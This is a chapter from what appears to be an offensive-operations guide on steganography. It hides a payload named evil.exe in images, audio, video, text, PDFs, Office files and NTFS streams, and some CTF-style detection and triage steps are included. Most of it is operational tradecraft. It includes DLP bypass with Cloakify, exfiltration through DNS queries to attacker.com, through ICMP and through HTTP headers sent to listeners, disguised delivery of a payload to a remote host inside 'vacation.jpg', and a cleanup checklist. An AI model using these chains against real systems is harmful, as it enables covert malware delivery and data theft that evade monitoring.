# Steganography - a short practicum: hide a file and get it back

> [← README](../../README.md) · [Next section →](14-troubleshooting.md)

Stego **doesn't encrypt**: it hides the fact that a transfer happened at all. So the chain is `archive -> encrypt -> stego -> transfer -> sha256` ([11](11-encryption.md)).

> The main rule: send the **original file** (as an attachment/archive), not a "photo" through Telegram/WhatsApp. Messengers recompress JPEG and kill the payload.

```bash
export LHOST=192.168.2.5
export RHOST=192.168.10.20
export PASS='StrongPassphrase!2026'
```

## 1. Quick selection

| Carrier / situation | Tool |
|---|---|
| JPEG/BMP/WAV, simple and password-protected | `steghide` |
| Detect/crack steghide | `stegseek` |
| PNG/BMP + GUI | `OpenStego` |
| PNG/JPEG/WAV/video with one tool | `stegpy` |
| JPEG, classic DCT | `outguess` / `jsteg` |
| WAV, plenty of room | `steghide` / `stegolsb` |
| MP3/WAV + any file, Windows | `DeepSound` |
| Text, invisible characters | `snow` / `stegcloak` |
| Bypass DLP with a word list | `Cloakify` |
| Windows with no tools | ADS / append-after-EOF |
| DNS/ICMP only | [12-dns-icmp.md](12-dns-icmp.md) |

---

## 2. Setup

**Tools (LHOST):**

```bash
sudo apt install -y steghide outguess exiftool binwalk foremost pngcheck imagemagick ffmpeg age poppler-utils
sudo gem install zsteg
pip install stegpy stego-lsb stegoveritas
```

```bash
mkdir -p ~/stego/{cover,payload,out} && cd ~/stego

# test binary; in real life your evil.exe goes here
head -c 200000 /dev/urandom > payload/evil.exe
file payload/evil.exe

# archive for stego
zip -9 -j payload/evil.zip payload/evil.exe

# base64 for text channels
base64 -w0 payload/evil.exe > payload/evil.b64

# encrypt BEFORE stego (recommended)
age -p -o payload/evil.zip.age payload/evil.zip

# reference hash
sha256sum payload/evil.zip | tee payload/evil.sha256
```

> In the examples below the payload is called `evil.zip`, and `evil.b64` for text channels. For real data, substitute `evil.zip.age`.

**Covers (offline):**

```bash
convert -size 1920x1080 plasma:fractal cover/cover.png
convert cover/cover.png -quality 92 cover/cover.jpg
convert -size 4000x3000 plasma:fractal cover/cover_big.png
ffmpeg -f lavfi -i "sine=frequency=440:duration=60" -ac 2 -ar 44100 cover/cover.wav
```

> PNG/BMP for LSB, JPEG for steghide/outguess, WAV PCM for audio. The noisier the texture, the better.

**Verification after extraction:**

```bash
sha256sum evil.zip
cat payload/evil.sha256   # compare the hashes
unzip -t evil.zip
```

---

## 3. Images

### 3.1 steghide (JPEG, BMP, WAV, AU; no PNG support)

```bash
sudo apt install -y steghide

# capacity
steghide info cover/cover.jpg

# hide
steghide embed -cf cover/cover.jpg -ef payload/evil.zip \
  -sf out/evil.jpg -p "$PASS" -z 9

# extract
steghide extract -sf out/evil.jpg -xf evil.zip -p "$PASS"
```

Flags: `-cf` cover, `-ef` what to hide, `-sf` output (without it the cover gets overwritten), `-p` password, `-z 9` compression.

### 3.2 stegseek (detection and brute force for steghide)

```bash
wget https://github.com/RickdeJager/stegseek/releases/download/v0.6/stegseek_0.6-1.deb
sudo dpkg -i stegseek_0.6-1.deb

# is there any steghide content?
stegseek --seed out/evil.jpg

# crack the password
stegseek out/evil.jpg /usr/share/wordlists/rockyou.txt -xf out/cracked.zip
```

### 3.3 OpenStego (PNG/BMP)

```bash
sudo apt install -y openstego

openstego embed -a randomlsb -e -A AES256 \
  -mf payload/evil.zip -cf cover/cover.png \
  -sf out/openstego.png -p "$PASS"

openstego extract -a randomlsb -sf out/openstego.png -xf evil.zip -p "$PASS"
```

### 3.4 stegpy (PNG/JPEG/WAV/video)

```bash
pip install stegpy

# hide (creates _cover.png next to it)
stegpy payload/evil.zip cover/cover.png -p

# extract (creates _evil.zip)
stegpy _cover.png -p

# JPEG
stegpy payload/evil.zip cover/cover.jpg -p

# check the carrier's capacity
stegpy cover/cover.png -c
```

> Without `-p` the data isn't encrypted. `-b 1|2|4` sets how many LSBs to use (default is 2).

### 3.5 outguess / jsteg

```bash
# outguess (JPEG, the key controls embedding; it doesn't encrypt the payload itself)
outguess -k "$PASS" -d payload/evil.zip cover/cover.jpg out/outguess.jpg
outguess -k "$PASS" -r out/outguess.jpg out/evil.zip

# jsteg (no password, educational)
go install lukechampine.com/jsteg/cmd/jsteg@latest
# or a prebuilt binary: https://github.com/lukechampine/jsteg/releases
jsteg hide cover/cover.jpg payload/evil.zip out/jsteg.jpg
jsteg reveal out/jsteg.jpg out/evil.zip
```

> F5 is an old academic tool. There's no single `f5.jar` with consistent syntax: the commands depend on the build. For practice, use `outguess` or `jsteg`.

---

## 4. Audio and video

### 4.1 steghide in WAV

```bash
steghide info cover/cover.wav

steghide embed -cf cover/cover.wav -ef payload/evil.zip \
  -sf out/evil.wav -p "$PASS" -z 9

steghide extract -sf out/evil.wav -xf evil.zip -p "$PASS"
```

> The WAV must be PCM. Transcoding to MP3 kills the payload.

### 4.2 stegolsb (WAV/PNG, pure LSB)

```bash
pip install stego-lsb

# hide
stegolsb wavsteg -h -i cover/cover.wav -s payload/evil.zip \
  -o out/evil.wav -n 2

# extract: you need the exact size of the hidden file
# find it on LHOST: stat -c%s payload/evil.zip
SIZE=200000   # replace with the exact archive size
stegolsb wavsteg -r -i out/evil.wav -o evil.zip -n 2 -b "$SIZE"
```

### 4.3 stegpy video

```bash
stegpy payload/evil.zip cover/clip.mp4 -p    # -> _clip.mp4
stegpy _clip.mp4 -p                          # -> _evil.zip
```

### 4.4 MP4 attachment (fast but obvious)

```bash
# hide
ffmpeg -i cover/clip.mp4 -attach payload/evil.zip \
  -metadata:s:t mimetype=application/zip \
  -metadata:s:t filename=evil.zip -c copy out/attachment.mp4

# extract
ffmpeg -dump_attachment:t evil.zip -i out/attachment.mp4 -y

# check
ffprobe -hide_banner out/attachment.mp4
```

### 4.5 MP3 / GUI

```bash
# MP3Stego: zip -> base64 -> hide in MP3
base64 -w0 payload/evil.zip > payload/evil.zip.b64
mp3stego-encode -E payload/evil.zip.b64 -P "$PASS" cover/cover.wav out/evil.mp3

# extract
mp3stego-decode -X -P "$PASS" out/evil.mp3
base64 -d out/evil.mp3.txt > evil.zip
```

> In the original build the commands may be called `encode`/`decode`; `mp3stego-encode` is a wrapper from stego-toolkit. Some builds require absolute paths.

**DeepSound** (Windows): open the carrier (MP3/WAV) -> `Add secret files` -> password -> `Encode`. On the receiving end: `Extract secret files`.

---

## 5. Text and documents

### 5.1 snow (spaces/tabs)

```bash
sudo apt install -y snow

# text
snow -C -m "Meet at 21:00. Code: 7742" -p "$PASS" cover/cover.txt out/evil.txt
snow -C -p "$PASS" out/evil.txt

# snow is fine for small data, not for a 200 KB binary
head -c 256 payload/evil.exe | base64 -w0 > payload/evil-small.b64
snow -C -m "$(cat payload/evil-small.b64)" -p "$PASS" cover/cover.txt out/evil.txt

# back again
snow -C -p "$PASS" out/evil.txt > evil-small.b64
base64 -d evil-small.b64 > evil-small.bin
```

> Awkward for large binaries and archives: snow bloats the text badly.

### 5.2 stegcloak (zero-width Unicode + AES)

```bash
sudo apt install -y nodejs npm
sudo npm install -g stegcloak

STEGCLOAK_PASSWORD="$PASS" stegcloak hide "secret text" "Regular message for colleagues."
stegcloak reveal "<text with invisible characters>"
```

For a file, it's better to hide a link/password rather than the archive itself:

```bash
STEGCLOAK_PASSWORD="$PASS" stegcloak hide "https://files.example/abc pass: S3cr3t" "Quarterly report..."
```

### 5.3 Cloakify (data disguised as a list)

```bash
git clone https://github.com/TryCatchHCF/Cloakify && cd Cloakify
# needs python2.7

# hide
gpg -c ../payload/evil.zip
python2 cloakify.py ../payload/evil.zip.gpg ciphers/desserts > ../out/innocent.txt

# extract
python2 decloakify.py ../out/innocent.txt ciphers/desserts > evil.zip.gpg
gpg evil.zip.gpg
```

### 5.4 PDF

```bash
# attach a file
pdfattach cover/cover.pdf payload/evil.zip out/with_attach.pdf

# list and extract
pdfdetach -list out/with_attach.pdf
pdfdetach -saveall out/with_attach.pdf
```

### 5.5 Office (docx/xlsx/pptx)

```bash
# append the zip after EOF
cat payload/evil.zip >> cover/report.docx

# find it
binwalk cover/report.docx
binwalk -e cover/report.docx

# inspect the XML for hidden text
unzip -p cover/report.docx word/document.xml | grep -i -E 'vanish|comment|instrText'
```

---

## 6. No tools: OS and filesystem

### 6.1 Windows: NTFS ADS

```cmd
:: hide
type C:\Temp\evil.zip > C:\Temp\cover.jpg:evil.zip

:: check
dir /r C:\Temp\cover.jpg

:: extract
type C:\Temp\cover.jpg:evil.zip > C:\Temp\out.zip
```

**PowerShell (more reliable for binaries):**

```powershell
# hide (PowerShell 5.1)
$b = [IO.File]::ReadAllBytes("C:\Temp\evil.zip")
Set-Content -Path "C:\Temp\cover.jpg" -Stream "evil.zip" -Value $b -Encoding Byte

# extract
$b = Get-Content -Path "C:\Temp\cover.jpg" -Stream "evil.zip" -Encoding Byte -ReadCount 0
[IO.File]::WriteAllBytes("C:\Temp\out.zip", $b)
```

> PowerShell 7: use `-AsByteStream` instead of `-Encoding Byte`. ADS is lost when copying to FAT/exFAT, into a ZIP, or when sending by email.

### 6.2 Append-after-EOF

```cmd
:: Windows
copy /b C:\Temp\cover.jpg + C:\Temp\evil.zip C:\Temp\out.jpg
```

```bash
# Linux
cat payload/evil.zip >> cover/cover.jpg
```

```bash
# extract by ZIP signature
python3 - <<'PY'
d = open('cover/cover.jpg','rb').read()
i = d.find(b'PK\x03\x04')
open('evil.zip','wb').write(d[i:])
PY

# or
binwalk -e cover/cover.jpg
```

### 6.3 ZIP comment and metadata

```bash
# ZIP comment (up to 65535 bytes)
zip -z out/archive.zip <<< "secret: 7742"
unzip -z out/archive.zip

# exiftool: small files only
exiftool -Comment="$(base64 -w0 payload/evil.zip)" cover/cover.jpg
exiftool -s3 -Comment cover/cover.jpg | base64 -d > evil.zip
```

---

## 7. Network

### 7.1 DNS / ICMP

Ready-made commands are in [12-dns-icmp.md](12-dns-icmp.md). In short:

```bash
# LHOST: catch DNS
sudo tcpdump -i any -n -s0 udp port 53 -w out/dns.pcap

# RHOST: a chunk in a subdomain
dig +short "$(printf 'hello' | base32 | tr -d '=').t.attacker.com"
```

```bash
# LHOST: catch ICMP
sudo tcpdump -i any -n -s0 icmp -w out/icmp.pcap

# RHOST: file in ping
sudo hping3 -1 -E payload/evil.zip -d 1400 $LHOST
```

### 7.2 HTTP headers

```bash
# LHOST: mini server that collects X-Trace
python3 - <<'PY'
from http.server import BaseHTTPRequestHandler, HTTPServer
import base64

chunks = []
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        v = self.headers.get("X-Trace")
        if v:
            chunks.append(base64.b64decode(v))
            open("out/evil.bin", "wb").write(b"".join(chunks))
        self.send_response(200); self.end_headers(); self.wfile.write(b"ok")
    def log_message(self, *a): pass

HTTPServer(("0.0.0.0", 8080), H).serve_forever()
PY
```

```bash
# RHOST: 512-byte chunks
split -b 512 payload/evil.zip /tmp/chunk_
for f in /tmp/chunk_*; do
  curl -s -H "X-Trace: $(base64 -w0 "$f")" http://$LHOST:8080/
done
```

### 7.3 Unicode steganography: zero-width, homoglyphs, emoji

Works in text, chat, tickets, LLM prompts. Capacity is low: ~2 bits per character.

| Character | Code |
|---|---|
| ZWSP | `U+200B` |
| ZWNJ | `U+200C` |
| ZWJ | `U+200D` |
| BOM | `U+FEFF` |

**Hide/extract (Python, educational):**

```python
ZW = ['\u200b', '\u200c', '\u200d', '\ufeff']

def hide(text: str, data: bytes) -> str:
    if len(data) * 4 > len(text):
        raise ValueError("data doesn't fit in the text: 4 characters needed per byte")
    bits = ''.join(f'{b:08b}' for b in data)
    out = []
    for i, ch in enumerate(text):
        out.append(ch)
        pair = bits[i * 2:i * 2 + 2]
        if len(pair) == 2:
            out.append(ZW[int(pair, 2)])
    return ''.join(out)

def reveal(text: str) -> bytes:
    bits = ''.join(f'{ZW.index(c):02b}' for c in text if c in ZW)
    return bytes(int(bits[i:i + 8], 2) for i in range(0, len(bits) - 7, 8))

payload = b"MZ\x90\x00"  # start of a PE file, for example
stego = hide("Regular message for colleagues.", payload)
print(reveal(stego))
```

**Ready-made tool:** `stegcloak` (see 5.2).

**Detection:**

```bash
grep -nP '[\x{200B}\x{200C}\x{200D}\x{FEFF}]' suspicious.txt
python3 -c "import unicodedata; s=open('suspicious.txt').read(); print({hex(ord(c)) for c in s if unicodedata.category(c)=='Cf'})"
```

**ASCII smuggling** (invisible Unicode Tags, `U+E0000`-`U+E007F`) is used against LLMs:

```python
text = open("suspicious.txt", encoding="utf-8").read()
bad = [hex(ord(c)) for c in text if 0xE0000 <= ord(c) <= 0xE007F]
print(bad)
```

---

## 8. Quick triage (CTF / verification)

```bash
# general triage
file f; exiftool f; strings -n 8 f | head; binwalk f; binwalk -e f

# PNG/BMP
zsteg -a f.png
zsteg -E "b1,rgb,lsb,xy" f.png > out.bin
stegoveritas f.png -outdir out/veritas
pngcheck -v f.png

# JPEG
steghide info f.jpg
steghide extract -sf f.jpg -xf out -p ''
stegseek --seed f.jpg
stegseek f.jpg /usr/share/wordlists/rockyou.txt
outguess -k 'pass' -r f.jpg out

# audio
sox f.wav -n spectrogram -o spec.png
steghide extract -sf f.wav -xf out -p ''

# text
snow -C -p pass f.txt
grep -nP '[\x{200B}\x{200C}\x{200D}\x{FEFF}]' f.txt

# PDF/Office
pdfdetach -list f.pdf
pdfdetach -saveall f.pdf
unzip -l f.docx
unzip -p f.docx word/document.xml | grep -i vanish

# PCAP
tshark -r f.pcap -Y 'dns.qry.name' -T fields -e dns.qry.name | sort -u
tshark -r f.pcap -Y 'icmp.type == 8' -T fields -e data.data
```

> 80% of CTF stego is `steghide` with an empty password, `zsteg`, or `binwalk`. Start there, not with the exotic stuff.

---

## 9. End-to-end scenarios

### 9.1 LHOST -> RHOST: deliver a file inside an image

```bash
# LHOST: the archive is already built in payload/evil.zip
steghide info cover/cover.jpg
steghide embed -cf cover/cover.jpg -ef payload/evil.zip \
  -sf out/vacation.jpg -p "$PASS" -z 9

# LHOST: serve it
cd out && python3 -m http.server 8080
```

```powershell
# RHOST: download an ordinary-looking image
iwr "http://${LHOST}:8080/vacation.jpg" -OutFile "C:\Temp\vacation.jpg"
```

```powershell
# RHOST: extract (via WSL)
wsl steghide extract -sf /mnt/c/Temp/vacation.jpg -xf evil.zip -p 'StrongPassphrase!2026'
```

```bash
# RHOST: verify
sha256sum evil.zip
unzip -t evil.zip
```

### 9.2 RHOST -> LHOST: exfil through PNG

```python
# LHOST: save_upload.py
from http.server import BaseHTTPRequestHandler, HTTPServer

class H(BaseHTTPRequestHandler):
    def do_POST(self):
        n = int(self.headers.get('Content-Length', 0))
        open('out/upload.png', 'ab').write(self.rfile.read(n))
        self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
    def log_message(self, *a): pass

HTTPServer(('0.0.0.0', 8080), H).serve_forever()
```

```bash
# LHOST
python3 save_upload.py
```

```bash
# RHOST: hide and send as a normal file
stegpy payload/evil.zip cover/cover.png -p
curl -s -X POST --data-binary @_cover.png http://$LHOST:8080/upload
```

```bash
# LHOST: extract
stegpy out/upload.png -p
```

---

## 10. Common mistakes

| Mistake | What to do |
|---|---|
| `steghide` on a PNG | steghide doesn't support PNG: use `zsteg`, `OpenStego`, `stegpy` |
| `zsteg` on a JPEG | zsteg doesn't support JPEG: use `steghide`, `stegseek`, `outguess` |
| Forgot `-sf` | steghide overwrites the cover |
| `the file is too big` | use a bigger/noisier cover or a PNG-capable tool |
| `could not extract any data with that passphrase` | wrong password, or the file got recompressed |
| Sent the photo through Telegram | recompression destroyed the LSB: send it as a file/archive |
| WAV won't extract | specify the exact size with `-b` |
| Password `123456` | stegseek cracks it in seconds; use 16+ characters and encrypt before stego |
| Extracted, but the hash doesn't match | file damaged/recompressed, or wrong password |
| "Stego = encryption" | no: run `age`/`gpg`/`7z` first, then hide |

**Mini checklist:**

```text
[ ] payload encrypted before stego
[ ] cover makes sense in context
[ ] capacity > payload * 1.3
[ ] stego opens as a normal file
[ ] extraction verified on another machine
[ ] sha256 matched
[ ] password sent over a different channel
[ ] temp files deleted
```

---

[← Back to the index](../../README.md)
